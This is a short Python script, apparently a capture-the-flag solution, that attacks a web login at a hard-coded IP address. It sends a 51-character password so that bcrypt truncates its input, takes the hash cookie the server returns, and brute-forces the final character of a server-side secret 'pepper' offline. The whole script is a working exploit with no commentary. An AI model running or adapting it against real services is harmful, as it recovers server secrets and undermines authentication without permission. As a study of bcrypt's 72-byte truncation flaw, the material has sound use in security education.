import base64
import bcrypt
import string
import requests

URL = "http://34.84.32.212:8080"
pepper1_15 = "PmVG7xe9ECBSgLU"


response = requests.post(
    URL, data={"auth": "guest", "password": "A" * 51}, allow_redirects=False
)
hash = base64.b64decode(response.cookies["hash"])

if hash.startswith(b"$2y$"):
    hash = b"$2b$" + hash[4:]

for i in string.printable:
    if bcrypt.checkpw(f"{pepper1_15}{i}guest{'A' * 51}".encode(), hash):
        print(f"FOUND: {pepper1_15}{i}")
        break
